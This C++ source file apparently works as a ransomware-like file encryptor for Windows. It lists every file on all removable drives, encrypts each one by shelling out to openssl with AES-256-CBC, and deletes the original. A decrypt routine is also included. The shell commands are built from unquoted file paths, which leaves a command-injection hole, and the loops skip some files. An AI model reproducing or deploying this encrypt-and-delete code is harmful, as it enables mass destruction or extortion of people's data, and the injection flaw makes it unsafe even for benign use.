#include<Windows.h>
#include <iostream>
#include<filesystem>
#include<tchar.h>
#include<vector>
#include <atlstr.h>
#include<fstream>
#include<iterator>
#include<cstdio>

#include<openssl/sha.h>


namespace filesystem = std::filesystem;

//void get_files(std::vector<std::string>& paths, std::string root_path)
//{
//
//	for (const auto& file : filesystem::directory_iterator(root_path))
//	{
//		if (filesystem::is_directory(file))
//		{
//			get_files(paths, file.path().string());
//		}
//	}
//}

void get_files(std::vector<std::filesystem::path>& paths, LPCTSTR root_path)  //get all files in root dir
{
	CStringA stringA(root_path);
	const char* const_char_root_path = stringA;
	char* char_root_path = const_cast<char*>(const_char_root_path);
	for (const auto& file : filesystem::directory_iterator(const_char_root_path))
	{
		if (filesystem::is_directory(file))
		{
			get_files(paths, file.path().string().c_str());
		}
		else
		{
			paths.push_back(file.path().string());
		}
	}
}

void fill_paths(std::vector<std::filesystem::path>& paths) // fill vector of paths with all full path in root dir
{
	TCHAR sz_buffer[256];
	LPCTSTR buffer_ptr = sz_buffer;
	GetLogicalDriveStrings(255, sz_buffer);

	for (buffer_ptr; *buffer_ptr != '\0'; buffer_ptr += _tcsclen(sz_buffer) + 1)
	{
		if (GetDriveType(buffer_ptr) == DRIVE_REMOVABLE)
		{
			get_files(paths, buffer_ptr);
		}
	}
}
void encrypt(std::vector<std::filesystem::path>& paths) // encrypt all files in root dir
{
	for (size_t i = 2; i < paths.size(); ++i)
	{
		std::string ENCRYPT_COMMAND = "openssl aes-256-cbc -a -salt -pbkdf2  -in " + paths[i].string() + " -out " + paths[i].string() + ".encr";
		system(ENCRYPT_COMMAND.c_str());
		ENCRYPT_COMMAND.clear();
		std::cout << paths[i];
		remove(paths[i].string().c_str());
	}
}
void decrypt(std::vector<std::filesystem::path>& paths) // decrypt all files in root dir
{
	for (size_t i = 2; i < paths.size(); ++i)
	{
		std::string DERYPT_COMMAND = "openssl aes-256-cbc -d -a -salt -pbkdf2  -in " + paths[i].string() + " -out " + paths[i].string().erase(paths[i].string().find_last_of('.'), paths[i].string().size());
		system(DERYPT_COMMAND.c_str());
		DERYPT_COMMAND.clear();
		std::cout << paths[i];
		remove(paths[i].string().c_str());
	}
}
int main()
{
	std::vector<std::filesystem::path> paths;
	  fill_paths(paths);

	 // encrypt(paths);
	  decrypt(paths);
}


